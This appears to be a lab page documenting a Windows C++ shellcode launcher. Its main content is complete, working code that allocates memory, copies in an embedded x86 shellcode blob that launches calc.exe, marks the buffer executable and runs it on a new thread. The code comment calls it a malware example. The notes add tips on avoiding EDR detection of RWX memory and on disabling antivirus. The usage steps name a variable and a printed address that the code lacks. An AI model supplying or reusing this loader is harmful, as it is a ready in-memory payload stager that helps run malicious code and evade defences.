# PoC — Shellcode Launcher (for debugging)

This page documents a tiny **shellcode launcher** program that allocates memory, copies a shellcode blob into it, marks it executable, and runs it on a new thread. It’s intentionally minimal and **useful when you want to debug a shellcode** (step through it, inspect memory/registers, verify APIs it resolves, etc.) in a controlled lab.


---

# Overview

The program:

1. Allocates RW memory with `VirtualAlloc`.
2. Copies the shellcode bytes into that buffer.
3. Changes protection to `PAGE_EXECUTE_READ` with `VirtualProtect` (W^X).
4. Creates a thread at the shellcode entry and waits for it to finish.

This keeps the code short and easy to instrument with a debugger.

---

# Program 

```cpp
/*
cpp implementation malware example with calc.exe payload
src: https://medium.com/@s12deff/executing-malicious-shell-code-with-c-8ad034e45044
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// our payload calc.exe
unsigned char my_payload[] = {
0x89, 0xe5, 0x83, 0xec, 0x20, 0x31, 0xdb, 0x64, 0x8b, 0x5b, 0x30, 0x8b, 0x5b, 0x0c, 0x8b, 0x5b,
0x1c, 0x8b, 0x1b, 0x8b, 0x1b, 0x8b, 0x43, 0x08, 0x89, 0x45, 0xfc, 0x8b, 0x58, 0x3c, 0x01, 0xc3,
0x8b, 0x5b, 0x78, 0x01, 0xc3, 0x8b, 0x7b, 0x20, 0x01, 0xc7, 0x89, 0x7d, 0xf8, 0x8b, 0x4b, 0x24,
0x01, 0xc1, 0x89, 0x4d, 0xf4, 0x8b, 0x53, 0x1c, 0x01, 0xc2, 0x89, 0x55, 0xf0, 0x8b, 0x53, 0x14,
0x89, 0x55, 0xec, 0xeb, 0x32, 0x31, 0xc0, 0x8b, 0x55, 0xec, 0x8b, 0x7d, 0xf8, 0x8b, 0x75, 0x18,
0x31, 0xc9, 0xfc, 0x8b, 0x3c, 0x87, 0x03, 0x7d, 0xfc, 0x66, 0x83, 0xc1, 0x08, 0xf3, 0xa6, 0x74,
0x05, 0x40, 0x39, 0xd0, 0x72, 0xe4, 0x8b, 0x4d, 0xf4, 0x8b, 0x55, 0xf0, 0x66, 0x8b, 0x04, 0x41,
0x8b, 0x04, 0x82, 0x03, 0x45, 0xfc, 0xc3, 0xba, 0x78, 0x78, 0x65, 0x63, 0xc1, 0xea, 0x08, 0x52,
0x68, 0x57, 0x69, 0x6e, 0x45, 0x89, 0x65, 0x18, 0xe8, 0xb8, 0xff, 0xff, 0xff, 0x31, 0xc9, 0x51,
0x68, 0x2e, 0x65, 0x78, 0x65, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x89, 0xe3, 0x41, 0x51, 0x53, 0xff,
0xd0, 0x31, 0xc9, 0xb9, 0x01, 0x65, 0x73, 0x73, 0xc1, 0xe9, 0x08, 0x51, 0x68, 0x50, 0x72, 0x6f,
0x63, 0x68, 0x45, 0x78, 0x69, 0x74, 0x89, 0x65, 0x18, 0xe8, 0x87, 0xff, 0xff, 0xff, 0x31, 0xd2,
0x52, 0xff, 0xd0
};

unsigned int my_payload_len = sizeof(my_payload);

int main(void) {
    void* my_payload_mem; // memory buffer for payload
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    // Allocate a memory buffer for payload
    my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to buffer
    RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);

    // make new buffer as executable
    rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
    if (rv != 0) {
        // run payload
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)my_payload_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }
    return 0;
}
```

---

# How to use (for debugging shellcode)

1. **Insert your shellcode** into `g_shellcode` (and update length if you paste manually).
2. **Compile**.
3. **Set a breakpoint** at the printed buffer address (or on `CreateThread/_beginthreadex`) in your debugger (x64dbg/WinDbg/IDA).
4. **Run and step** into the buffer to debug instructions, inspect stack, confirm API resolves, etc.

> Tip: If your shellcode expects arguments or a specific context, stub them before the call, or use a small trampoline that sets up registers/stack.

---

# Important notes & troubleshooting

* **DEP / W^X:** Use `VirtualAlloc` with RW, then `VirtualProtect` to RX (as shown). Avoid RWX; some EDRs flag it and it’s a bad habit.
* **Bitness:** Match your shellcode with the launcher (x86 vs x64). 32-bit shellcode under WOW64 must be launched by a 32-bit process.
* **ASLR-aware absolute addresses:** If your shellcode uses absolute module addresses, ensure it resolves bases dynamically (PEB/TEB walks or `GetModuleHandle` via imports) or uses RIP-relative code.
* **Null bytes in shellcode:** Fine here—bytes are copied verbatim. Only a concern when embedding in C-strings or passing through string APIs.
* **Console privileges:** Normal user context is fine for local execution. Admin is not required unless your shellcode does privileged actions.
* **AV/EDR:** Benign lab shellcode can still be flagged. If you’re only **debugging**, disable the product in a disposable VM, or add exclusions for your lab folder.
